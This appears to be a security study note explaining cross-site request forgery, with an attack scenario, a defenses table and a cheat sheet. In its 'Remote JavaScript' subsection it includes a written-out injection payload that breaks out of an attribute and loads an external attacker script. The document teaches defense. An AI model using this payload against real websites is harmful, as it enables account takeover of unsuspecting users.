# Cross-Site Request Forgery (CSRF)

## Definition

**CSRF** tricks a victim's browser into sending a request to a web application where the victim is **already authenticated** — the request rides on the victim's existing session, so the server has no easy way to tell it wasn't intentional.

This connects directly to a principle from the Web Fundamentals notebook (file 06): *the client controls the HTTP request.* A server that authorizes an action purely because a valid session cookie was attached — without also confirming the request was something the user actually meant to do — is exactly what CSRF exploits.

CSRF can be delivered **via XSS** (injected JS directly fires the request) but doesn't require it — a plain HTML form or image tag pointing at the target endpoint can be enough, since the browser attaches cookies automatically to any request to that domain regardless of which page triggered it.

## Example

Classic scenario — forcing a password change:
1. Attacker plants malicious content (e.g. a hidden auto-submitting form, or JS) on some page.
2. An authenticated victim visits that page.
3. The victim's browser automatically sends a password-change request to the vulnerable app, **using the victim's real, valid session cookie**.
4. If the app doesn't verify the request's true origin/intent, the change succeeds.
5. The attacker now knows the new password and can log in as the victim.

CSRF is especially attractive against **administrators**, since their sessions typically unlock far more sensitive functionality than a regular user's.

### Remote JavaScript

```html
"><script src=//www.example.com/exploit.js></script>
```
An injected `<script>` tag can pull in externally-hosted, attacker-controlled logic — meaning the actual attack payload doesn't even need to live on the vulnerable site itself.

## Prevention

| Defense | How it helps |
|---|---|
| **Sanitization** | Strip special/non-standard characters from input before storing/rendering (closes off the injection point CSRF often piggybacks through) |
| **Validation** | Ensure input matches the expected format |
| **CSRF tokens** | A unique, unpredictable token per session/request that must be included and verified — a cross-site request can't know or attach it |
| **SameSite cookies** | `SameSite=Strict` or `Lax` restricts when an authentication cookie is sent on cross-origin requests |
| **Re-authentication** | Require the password again before sensitive actions (e.g. changing the password itself) |
| **WAF** | Can catch some attempts automatically, but is a supplementary layer, not the primary defense |

⚠️ These are best understood as **defense in depth** — layered protections, not a single silver bullet. None of them substitutes for the application being designed securely in the first place; a WAF or SameSite cookie catching most attempts still leaves you exposed to whatever slips past it.

## Cheat Sheet

```
CSRF = victim's browser + victim's valid session, tricked into an unwanted request
Root cause: server trusts "a valid session cookie was attached" as proof of INTENT

Delivery: hidden auto-submit form, malicious <img>/<script>, or via XSS

Defenses (layer these, don't rely on just one):
  CSRF tokens          — per-request/session, unguessable, checked server-side
  SameSite=Strict/Lax   — cookie not sent on (most) cross-site requests
  Re-authentication      — password re-entry before sensitive actions
  Sanitization/Validation  — closes off injection points CSRF piggybacks on
  WAF                        — supplementary, not primary
```
